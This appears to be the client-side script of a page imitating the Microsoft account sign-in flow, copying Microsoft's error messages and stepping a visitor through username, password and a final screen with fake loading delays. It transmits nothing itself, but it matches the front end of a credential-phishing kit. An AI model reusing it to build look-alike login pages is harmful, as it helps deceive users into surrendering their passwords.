document.addEventListener('DOMContentLoaded', () => {
    const unReq = "Enter a valid email address, phone number, or Skype name.";
    const pwdReq = "Please enter the password for your Microsoft account.";

    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');

    let view = "uname";
    let unameVal = false, pwdVal = false;

    const nxt = document.getElementById('btn_next');
    const sig = document.getElementById('btn_sig');

    function showLoading(duration, callback) {
    // Show the loading section
        const loadingSection = document.getElementById('section_loading');
        loadingSection.classList.remove('d-none');

        // Hide all other sections
        document.getElementById('section_uname').classList.add('d-none');
        document.getElementById('section_pwd').classList.add('d-none');
        document.getElementById('section_final').classList.add('d-none');

        // Wait, then continue
        setTimeout(() => {
            loadingSection.classList.add('d-none'); // Hide loading screen
            callback(); // Proceed to next section (password)
        }, duration);
    }


    ///// ENTER KEY HANDLER
    document.addEventListener('keydown', function (e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            if (view === "uname") {
                nxt.click();
            } else if (view === "pwd") {
                sig.click();
            }
        }
    });

    ///// NEXT button click
    nxt.addEventListener('click', () => {
        validate();
        if (unameVal) {
            showLoading(1200, () => {
                document.getElementById("section_pwd").classList.remove('d-none');
                document.querySelectorAll('#user_identity').forEach((e) => {
                    e.innerText = unameInp.value;
                });
                view = "pwd";
            });
        }
    });

    ///// SIGN IN button click
    sig.addEventListener('click', () => {
    validate();
    if (pwdVal) {
        showLoading(1500, () => {
            document.getElementById("section_pwd").classList.add('d-none');
            document.getElementById('section_final').classList.remove('d-none');
            view = "final";
        });
    }
});
    ///// Validation
    function validate() {
        function unameValAction(valid) {
            if (!valid) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp');
                unameVal = true;
            }
        }

        function pwdValAction(valid) {
            if (!valid) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp');
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp');
                pwdVal = true;
            }
        }

        if (view === "uname") {
            unameValAction(unameInp.value.trim() !== "");
        } else if (view === "pwd") {
            pwdValAction(pwdInp.value.trim() !== "");
        }
    }

    ///// Back button
    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.add('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    });

    ///// Final buttons
    document.querySelectorAll('#btn_final').forEach((b) => {
        b.addEventListener('click', () => {
            window.open(location, '_self').close();
        });
    });
});
